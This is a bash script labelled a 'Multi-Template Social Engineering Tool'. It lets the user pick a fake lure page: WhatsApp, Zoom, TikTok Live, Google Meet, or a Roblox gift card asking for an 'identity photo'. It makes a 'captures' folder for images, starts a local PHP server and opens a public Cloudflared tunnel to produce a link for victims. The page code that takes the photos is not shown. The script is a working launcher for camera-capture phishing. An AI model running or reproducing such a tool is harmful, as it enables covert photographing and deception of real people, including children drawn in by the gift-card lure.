#!/bin/bash
# Multi-Template Social Engineering Tool

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

clear
echo -e "${RED}Choose Template to Generate Link:${NC}"
echo -e "${RED}[1] WhatsApp Web (Camera Verification)${NC}"
echo -e "${RED}[2] Zoom Meeting (Join with Camera)${NC}"
echo -e "${RED}[3] TikTok Live (Guest Camera)${NC}"
echo -e "${RED}[4] Google Meet (Test Mic/Cam)${NC}"
echo -e "${RED}[5] Roblox Gift Card (Identity Photo)${NC}"
echo -e "${RED}[0] Exit${NC}"
read -p "Selection: " template

# إنشاء مجلد للصور لو مش موجود
mkdir -p captures

case $template in
    1|2|3|4|5)
        echo -e "${GREEN}[*] Starting Local Server...${NC}"
        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
        sleep 2
        echo -e "${GREEN}[*] Launching Cloudflared Tunnel...${NC}"
        cloudflared tunnel --url http://127.0.0.1:8080
        ;;
    0) exit ;;
esac
